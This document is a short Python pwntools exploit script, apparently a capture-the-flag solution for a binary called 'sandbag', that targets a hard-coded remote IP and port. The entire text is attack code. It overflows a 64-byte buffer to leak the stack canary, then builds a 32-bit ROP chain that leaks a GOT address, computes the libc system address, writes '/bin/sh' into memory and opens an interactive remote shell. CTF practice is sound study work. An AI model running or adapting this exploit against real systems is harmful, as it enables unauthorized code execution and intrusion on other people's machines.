from pwn import *

def texp(num1,num2):
	p.recvuntil("6. Exit\n---------------------------\n")
	p.sendline(str(num1))
	p.recvuntil("---------------------------\n")
	p.recvuntil("---------------------------\n")
	p.sendline(str(num2))
	return p.recvline()



#p = process("./sandbag")
p = remote("222.110.147.52", 6975)

i=1
j=1
while True:
	for k in range(0,12):
		print texp(i,j)
		print i
		print j
	j+=1
	if(i==1 and j==4):
		i=2
		j=1
	if(i==2 and j==4):
		break

texp(3,4)
pay = "A"*64
texp(2,4)
p.recvuntil("Input your attack:")
p.sendline(pay)
p.recvuntil("\n" + pay)
cana = u32(p.recv(4)[0:])-0xa
print "[Canary] : 0x%x" % cana


puts = 0x080484C0
pr = 0x08048465
pppr = 0x08048f49
bss = 0x0804b040 + 8
got = 0x804b01c
read = 0x08048480

pay = "A"*64 + p32(cana) + "ABCD" 
pay += p32(puts) + p32(pr) + p32(got)
pay += p32(read) + p32(pppr) + p32(0) +p32(bss) + p32(8)
pay += p32(read) + p32(pppr) + p32(0) + p32(got) + p32(4)
pay += p32(puts) + "ABCD" + p32(bss)

texp(2,4)
p.recvuntil("Input your attack:")

p.sendline(pay)
context.log_level='debug'
p.recvuntil("\n" + "A"*64)
p.recvuntil("---------------------------\n")
p.sendline('6')
p.recvuntil("Good Bye~\n")
leak = u32(p.recv(4)[0:]) - 0x005FCA0 + 0x003ADA0
print "[Leak] : 0x%x" % leak
p.send("/bin/sh\x00")
p.send(p32(leak))
p.interactive()
